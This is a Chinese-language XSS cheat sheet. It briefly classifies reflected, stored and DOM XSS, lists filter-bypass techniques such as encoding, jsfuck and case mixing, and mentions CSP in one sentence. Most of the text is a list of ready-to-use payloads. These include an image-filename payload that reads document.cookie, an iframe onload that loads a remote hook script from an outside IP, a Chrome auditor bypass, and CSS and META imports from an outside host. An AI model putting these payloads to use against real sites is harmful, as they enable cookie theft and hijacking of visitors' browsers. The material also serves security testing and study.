XSS
================================

分类
--------------------------------
反射型xss
    一次浏览
    最常见，最广泛
    e.g http://www.baidu.com<script>alert("hack")</script>
储存型xss
    危害较大
    把相应脚本传到服务器上
DOMxss
    类似储存型


技巧
--------------------------------
1. 利用<>标记
2. 利用html属性
    - href
    - lowsrc
    - bgsound
    - background
    - value
    - action
    - dynsrc

3. 利用回车拆分关键字
4. 利用编码绕过
    - jsfuck
    - String.fromCharCode
    - HTML
    - URL

5. 大小写混淆
6. 对标签属性值转码
7. 产生事件
8. css跨站解析


CSP
--------------------------------
Content Security Policy，简称 CSP。顾名思义，这个规范与内容安全有关，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。


payload
--------------------------------

常用
::

    <script>alert(/xss/)</script>

伪协议
::

    <table background="javascript:alert(/xss/)"></table>

Chrome XSS auditor bypass with HPP:
::

    ?param=https://&param=@z.exeye.io/import%20rel=import%3E

长度限制
::

    <script>s+="l"</script>
    \...
    <script>eval(s)</script>

jquery sourceMappingURL
::

    </textarea><script>var a=1//@ sourceMappingURL=//xss.site</script>

图片名
::

    "><img src=x onerror=alert(document.cookie)>.gif

过期的payload
::
    
    src=javascript:alert 基本不可以用
    css expression特性只在旧版本ie可用

css
::

    <div style="background-image:url(javascript:alert(/xss/))">
    <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>

iframe
::

    <iframe onload='
        var sc   = document.createElement("scr" + "ipt");
        sc.type  = "text/javascr" + "ipt";
        sc.src   = "http://1.2.3.4/js/hook.js";
        document.body.appendChild(sc);
        '
    />

meta
::

    <META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
